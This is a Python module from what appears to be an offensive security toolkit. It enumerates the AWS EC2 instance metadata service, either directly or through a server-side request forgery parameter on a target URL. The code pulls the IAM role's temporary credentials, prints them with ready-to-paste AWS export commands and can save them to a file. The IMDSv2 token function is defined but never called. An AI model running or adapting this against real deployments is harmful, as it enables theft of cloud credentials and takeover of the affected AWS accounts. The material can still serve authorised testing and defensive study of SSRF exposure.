"""
AWS EC2 Metadata Service Enumeration
Enumerate instance metadata via SSRF or local access
"""

import subprocess
from core.module_base import ModuleBase, ModuleType, Platform


class EC2Metadata(ModuleBase):
    """
    AWS EC2 Instance Metadata enumeration
    Access metadata service (169.254.169.254) to extract credentials and info
    """

    def __init__(self):
        super().__init__()
        self.name = "ec2_metadata"
        self.description = "AWS EC2 metadata enumeration - extract credentials via IMDS"
        self.author = "UwU Toolkit"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.MULTI
        self.tags = ["aws", "ec2", "cloud", "ssrf", "metadata", "imds", "credentials"]
        self.references = [
            "https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/",
            "https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html",
        ]

        # Register options
        self.register_option("TARGET", "Target URL for SSRF or 'local' for direct access", default="local")
        self.register_option("SSRF_PARAM", "Parameter name for SSRF injection", default="url")
        self.register_option("IMDS_VERSION", "IMDS version: v1 or v2", default="v1",
                           choices=["v1", "v2"])
        self.register_option("OUTPUT_FILE", "Save credentials to file", default="")

    def fetch_metadata(self, path: str, base_url: str = "http://169.254.169.254") -> str:
        """Fetch metadata from IMDS"""
        target = self.get_option("TARGET")
        full_url = f"{base_url}{path}"

        if target == "local":
            # Direct local access
            try:
                result = subprocess.run(
                    ["curl", "-s", "-m", "5", full_url],
                    capture_output=True, text=True, timeout=10
                )
                return result.stdout
            except:
                return ""
        else:
            # SSRF through target URL
            ssrf_param = self.get_option("SSRF_PARAM")
            try:
                ssrf_url = f"{target}?{ssrf_param}={full_url}"
                result = subprocess.run(
                    ["curl", "-s", "-m", "10", ssrf_url],
                    capture_output=True, text=True, timeout=15
                )
                return result.stdout
            except:
                return ""

    def get_imds_token(self) -> str:
        """Get IMDSv2 token"""
        try:
            result = subprocess.run([
                "curl", "-s", "-m", "5", "-X", "PUT",
                "-H", "X-aws-ec2-metadata-token-ttl-seconds: 21600",
                "http://169.254.169.254/latest/api/token"
            ], capture_output=True, text=True, timeout=10)
            return result.stdout.strip()
        except:
            return ""

    def run(self) -> bool:
        target = self.get_option("TARGET")
        imds_version = self.get_option("IMDS_VERSION")

        self.print_status(f"Target: {target}")
        self.print_status(f"IMDS Version: {imds_version}")
        self.print_line()

        # Key metadata paths to enumerate
        paths = {
            "Instance ID": "/latest/meta-data/instance-id",
            "Instance Type": "/latest/meta-data/instance-type",
            "AMI ID": "/latest/meta-data/ami-id",
            "Availability Zone": "/latest/meta-data/placement/availability-zone",
            "Region": "/latest/meta-data/placement/region",
            "Public IP": "/latest/meta-data/public-ipv4",
            "Private IP": "/latest/meta-data/local-ipv4",
            "MAC Address": "/latest/meta-data/mac",
            "Security Groups": "/latest/meta-data/security-groups",
            "IAM Role": "/latest/meta-data/iam/security-credentials/",
            "User Data": "/latest/user-data",
        }

        self.print_status("Enumerating instance metadata...")
        self.print_line()

        results = {}
        for name, path in paths.items():
            data = self.fetch_metadata(path)
            if data and "404" not in data and "Not Found" not in data:
                results[name] = data.strip()
                self.print_good(f"{name}: {data.strip()[:100]}")
            else:
                self.print_warning(f"{name}: Not available")

        # If we found an IAM role, get the credentials
        if "IAM Role" in results and results["IAM Role"]:
            role_name = results["IAM Role"].strip()
            self.print_line()
            self.print_status(f"Found IAM role: {role_name}")
            self.print_status("Extracting temporary credentials...")

            cred_path = f"/latest/meta-data/iam/security-credentials/{role_name}"
            creds = self.fetch_metadata(cred_path)

            if creds:
                self.print_good("Credentials retrieved!")
                self.print_line()
                self.print_line(creds)
                self.print_line()

                # Parse and display
                import json
                try:
                    cred_data = json.loads(creds)
                    self.print_good("Parsed credentials:")
                    self.print_line(f"  AccessKeyId:     {cred_data.get('AccessKeyId', 'N/A')}")
                    self.print_line(f"  SecretAccessKey: {cred_data.get('SecretAccessKey', 'N/A')[:20]}...")
                    self.print_line(f"  Token:           {cred_data.get('Token', 'N/A')[:50]}...")
                    self.print_line(f"  Expiration:      {cred_data.get('Expiration', 'N/A')}")
                    self.print_line()
                    self.print_status("Export commands:")
                    self.print_line(f"  export AWS_ACCESS_KEY_ID={cred_data.get('AccessKeyId', '')}")
                    self.print_line(f"  export AWS_SECRET_ACCESS_KEY={cred_data.get('SecretAccessKey', '')}")
                    self.print_line(f"  export AWS_SESSION_TOKEN={cred_data.get('Token', '')}")

                    # Save to file if requested
                    output_file = self.get_option("OUTPUT_FILE")
                    if output_file:
                        with open(output_file, 'w') as f:
                            f.write(creds)
                        self.print_good(f"Credentials saved to: {output_file}")

                except json.JSONDecodeError:
                    self.print_warning("Could not parse credentials as JSON")

        return True

    def check(self) -> bool:
        """Check if curl is available"""
        import shutil
        return shutil.which("curl") is not None
